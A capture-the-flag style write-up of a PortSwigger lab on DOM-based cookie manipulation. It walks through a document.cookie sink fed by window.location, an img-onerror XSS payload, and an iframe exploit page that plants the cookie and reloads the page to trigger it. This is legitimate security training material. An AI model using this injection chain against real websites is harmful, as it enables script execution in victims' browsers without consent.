# DOM-based cookie manipulation

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation), you'll learn: DOM-based cookie manipulation! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause [XSS](https://portswigger.net/web-security/cross-site-scripting) on a different page and call the `print()` function. You will need to use the exploit server to direct the victim to the correct pages.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-5/images/Pasted%20image%2020230114183148.png)

In the home page, we can view other products:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-5/images/Pasted%20image%2020230114183313.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-5/images/Pasted%20image%2020230114183358.png)

**View source page:**
```html
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

In here, **we see a `document.cookie` sink (Dangerous function).** And **the source (attacker controllable input) is `window.location`.**

That being said, **it'll set a new cookie called `lastViewdProduct`, with the value of our `window.location` property.**

Let's refresh the page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-5/images/Pasted%20image%2020230114183817.png)

```html
<a href='https://0af2006504761747c0200a5f001a0028.web-security-academy.net/product?productId=1'>Last viewed product</a><p>|</p>
```

When we refreshed the page, it'll create a new `<a>` element, with attribute `href`, and it's value is our `window.location` property.

That being said, we can try to exploit XSS!

**Payload:**
```html
/product?productId=1&payload='><img src=errorpls onerror="print()">
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-5/images/Pasted%20image%2020230114184337.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-5/images/Pasted%20image%2020230114184354.png)

Our evil cookie has been set!

Let's refresh the page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-5/images/Pasted%20image%2020230114184423.png)

Nice!

**Now, we can create a HTML payload to trigger the XSS payload to the victim:**
```html
<html>
    <head>
        <title>DOM-based cookie manipulation</title>
    </head>
    <body>
        <iframe src="https://0af2006504761747c0200a5f001a0028.web-security-academy.net/product?productId=1&payload=%27%3E%3Cimg%20src%3Derrorpls%20onerror%3D%22print%28%29%22%3E" onload="if(!window.triggerXSSPayload)this.src='https://0af2006504761747c0200a5f001a0028.web-security-academy.net';window.triggerXSSPayload=1;"></iframe>
    </body>
</html>
```

This payload will create an `<iframe>` element that pointing to our set cookie payload.

Then, when it's loaded, we checks the XSS payload triggered or not.

If not, then set the `<iframe>` attribute `src` property to the vulnerable website's home page. This will trigger our cookie's XSS payload.

**Then host it on the exploit server, and deliver it to victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-5/images/Pasted%20image%2020230114190003.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-5/images/Pasted%20image%2020230114190009.png)

# What we've learned:

1. DOM-based cookie manipulation